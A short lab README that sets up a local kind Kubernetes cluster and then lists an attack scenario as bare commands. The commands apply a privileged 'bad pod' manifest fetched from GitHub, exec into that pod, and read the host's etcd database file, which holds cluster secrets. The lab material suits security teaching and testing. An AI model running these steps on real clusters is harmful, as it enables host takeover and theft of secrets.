#### Create Cluster and set infrastructure

````
kind create cluster --config=cluster-setup.yaml

kubectl cluster-info --context kind-kind

kubectl apply -f serviceaccount.yaml

kubectl apply -f deployment.yaml

````

#### Attack scenario

````

kubectl get pods

kubectl exec -it $POD_NAME /bin/sh

kubectl apply -f https://raw.githubusercontent.com/LarsLefebvre/cloud-native-bad-pods/main/bad-pod.yaml

kubectl get pods

kubectl exec -it $BAD_POD_NAME /bin/sh

whoami

printenv 

cd /host/var/lib/etcd/member/snap

cat db

````


